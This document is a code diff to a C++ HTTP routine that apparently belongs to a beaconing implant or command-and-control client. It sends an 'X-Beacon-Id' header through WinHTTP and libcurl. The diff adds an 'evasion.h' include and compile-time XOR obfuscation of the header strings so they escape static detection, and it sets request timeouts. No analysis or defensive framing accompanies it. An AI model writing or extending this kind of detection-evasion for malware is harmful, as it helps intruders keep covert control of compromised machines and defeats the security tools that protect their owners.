@@ -24,6 +24,7 @@
 #include <ctime>
 
 #include "crypto.h"
+#include "evasion.h"
 
 namespace net {
 
@@ -106,10 +107,25 @@ inline std::string http_request(
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
     }
 
-    std::wstring headers = L"Content-Type: text/plain\r\n";
+    // Set explicit timeouts (5 seconds) to avoid hanging requests
+    WinHttpSetTimeouts(hRequest, 5000, 5000, 5000, 5000);
+
+    // Obfuscate the Content-Type header using compile‑time XOR
+    auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
+    std::string s_ct = XOR_DEC(enc_ct).c_str();
+    std::wstring headers(s_ct.begin(), s_ct.end());
+
     if (!beacon_id.empty()) {
+        auto enc_xb = XOR_STR("X-Beacon-Id: ");
+        std::string s_xb = XOR_DEC(enc_xb).c_str();
+        std::wstring wprefix(s_xb.begin(), s_xb.end());
+        
+        auto enc_rn = XOR_STR("\r\n");
+        std::string s_rn = XOR_DEC(enc_rn).c_str();
+        std::wstring wrn(s_rn.begin(), s_rn.end());
+
         std::wstring wid(beacon_id.begin(), beacon_id.end());
-        headers += L"X-Beacon-Id: " + wid + L"\r\n";
+        headers += wprefix + wid + wrn;
     }
 
     BOOL bResult = WinHttpSendRequest(
@@ -194,10 +210,16 @@ inline std::string http_request(
         curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
     }
 
+    // Explicit timeout: 5 seconds for connection, 10 seconds total
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+
     struct curl_slist *headers = NULL;
-    headers = curl_slist_append(headers, "Content-Type: text/plain");
+    auto enc_ct = XOR_STR("Content-Type: text/plain");
+    headers = curl_slist_append(headers, XOR_DEC(enc_ct).c_str());
     if (!beacon_id.empty()) {
-        std::string h = "X-Beacon-Id: " + beacon_id;
+        auto enc_xb = XOR_STR("X-Beacon-Id: ");
+        std::string h = std::string(XOR_DEC(enc_xb).c_str()) + beacon_id;
         headers = curl_slist_append(headers, h.c_str());
     }
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
